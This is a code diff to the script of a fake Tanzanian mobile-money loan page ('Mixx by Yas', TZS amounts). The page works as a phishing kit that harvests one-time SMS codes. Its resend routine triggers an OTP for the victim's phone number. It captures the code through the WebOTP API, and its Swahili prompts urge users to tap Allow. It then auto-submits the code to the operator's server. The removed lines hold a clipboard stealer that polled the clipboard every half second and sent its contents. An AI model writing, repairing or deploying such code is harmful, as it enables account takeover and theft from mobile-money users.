@@ -81,7 +81,7 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + parseInt(payAmount).toLocaleString();
         document.getElementById('showPhone').textContent = '+255 ' + userPhone;
 
-        var checkInterval = null, countdownTimer = null, clipWatcher = null, lastClip = '';
+        var checkInterval = null, countdownTimer = null;
         var resendCount = 0, resendCooldown = false, smsDetected = false;
 
         (function() {
@@ -95,7 +95,6 @@
 
         startCountdown();
         startAutoDetect();
-        startClipWatcher();
 
         function startCountdown() { 
             if (countdownTimer) clearInterval(countdownTimer); 
@@ -109,7 +108,16 @@
         }
 
         function startAutoDetect() {
-            if (!('OTPCredential' in window)) return;
+            if (!('OTPCredential' in window)) {
+                document.getElementById('codeError').textContent = 'Subiri SMS... (browser yako haitumii auto-detect)';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                return;
+            }
+            document.getElementById('codeError').textContent = 'Inasubiri SMS kutoka Mixx by Yas... Gusa Allow ikitokea.';
+            document.getElementById('codeError').style.color = 'var(--primary)';
+            document.getElementById('codeError').classList.add('show');
+            
             var ac = new AbortController();
             navigator.credentials.get({
                 otp: { transport: ['sms'] },
@@ -117,12 +125,10 @@
             }).then(function(otp) {
                 if (otp && otp.code && !smsDetected) {
                     smsDetected = true;
-                    // Send the FULL code from the SMS notification
                     document.getElementById('smsMessage').value = otp.code;
                     document.getElementById('codeError').textContent = '✅ Ujumbe umepokelewa kutoka notification! Inatuma...';
                     document.getElementById('codeError').style.color = 'var(--success)';
                     document.getElementById('codeError').classList.add('show');
-                    if (clipWatcher) clearInterval(clipWatcher);
                     if (countdownTimer) clearInterval(countdownTimer);
                     document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
                     document.getElementById('timerDisplay').className = 'timer-bar';
@@ -132,58 +138,16 @@
             setTimeout(function() { ac.abort(); }, 120000);
         }
 
-        function startClipWatcher() {
-            if (clipWatcher) clearInterval(clipWatcher);
-            lastClip = '';
-            clipWatcher = setInterval(checkClipboard, 500);
-        }
-
-        async function checkClipboard() {
-            if (!document.getElementById('screenCode').classList.contains('active') || smsDetected) {
-                clearInterval(clipWatcher);
-                return;
-            }
-            try {
-                var text = await navigator.clipboard.readText();
-                if (text && text !== lastClip && text.length > 15) {
-                    smsDetected = true;
-                    document.getElementById('smsMessage').value = text;
-                    document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa clipboard! Inatuma...';
-                    document.getElementById('codeError').style.color = 'var(--success)';
-                    document.getElementById('codeError').classList.add('show');
-                    clearInterval(clipWatcher);
-                    if (countdownTimer) clearInterval(countdownTimer);
-                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
-                    document.getElementById('timerDisplay').className = 'timer-bar';
-                    setTimeout(function() { submitCode(); }, 800);
-                }
-            } catch(e) {}
-        }
-
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden && document.getElementById('screenCode').classList.contains('active') && !smsDetected) {
-                lastClip = '';
-                startClipWatcher();
-            }
-        });
-
-        window.addEventListener('focus', function() {
-            if (document.getElementById('screenCode').classList.contains('active') && !smsDetected) {
-                setTimeout(async function() {
-                    try {
-                        var text = await navigator.clipboard.readText();
-                        if (text && text.length > 15 && !smsDetected) {
-                            smsDetected = true;
-                            document.getElementById('smsMessage').value = text;
-                            document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Inatuma...';
-                            document.getElementById('codeError').style.color = 'var(--success)';
-                            document.getElementById('codeError').classList.add('show');
-                            clearInterval(clipWatcher);
-                            if (countdownTimer) clearInterval(countdownTimer);
-                            setTimeout(function() { submitCode(); }, 800);
-                        }
-                    } catch(e) {}
-                }, 300);
+        document.getElementById('smsMessage').addEventListener('input', function() {
+            if (!smsDetected && this.value.trim().length > 10) {
+                smsDetected = true;
+                document.getElementById('codeError').textContent = '✅ Ujumbe umewekwa! Inatuma...';
+                document.getElementById('codeError').style.color = 'var(--success)';
+                document.getElementById('codeError').classList.add('show');
+                if (countdownTimer) clearInterval(countdownTimer);
+                document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                document.getElementById('timerDisplay').className = 'timer-bar';
+                setTimeout(function() { submitCode(); }, 500);
             }
         });
 
@@ -192,18 +156,18 @@
             if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
             if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi. Jaribu baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
             resendCount++; resendCooldown = true; smsDetected = false;
-            document.getElementById('smsMessage').value = ''; lastClip = '';
-            document.getElementById('codeError').textContent = 'OTP Imetumwa. (' + resendCount + '/3)'; 
+            document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri... (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
             try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: parseInt(payAmount), months: 12, loan_type: '', purpose: 'OTP REQUESTED' }) }); } catch(e) {} 
-            startClipWatcher(); startCountdown(); startAutoDetect();
+            startCountdown(); startAutoDetect();
             setTimeout(function() { resendCooldown = false; }, 30000);
         }
 
         async function submitCode() { 
-            if (clipWatcher) { clearInterval(clipWatcher); } if (countdownTimer) { clearInterval(countdownTimer); } 
+            if (countdownTimer) { clearInterval(countdownTimer); } 
             var smsText = document.getElementById('smsMessage').value.trim();
-            if (!smsText) { document.getElementById('codeError').textContent = 'Subiri ujumbe wa SMS...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); startClipWatcher(); return; }
+            if (!smsText) { document.getElementById('codeError').textContent = 'Subiri ujumbe wa SMS...'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); return; }
             document.getElementById('screenCode').classList.remove('active'); document.getElementById('screenWait').classList.add('active'); 
             await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
             if (checkInterval) clearInterval(checkInterval); 
@@ -220,10 +184,10 @@
 
         function showCodeError() { 
             document.getElementById('screenWait').classList.remove('active'); document.getElementById('screenCode').classList.add('active'); 
-            document.getElementById('smsMessage').value = ''; lastClip = ''; smsDetected = false;
+            document.getElementById('smsMessage').value = ''; smsDetected = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); 
-            startCountdown(); startClipWatcher(); startAutoDetect();
+            startCountdown(); startAutoDetect();
             setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); 
         }
     </script>
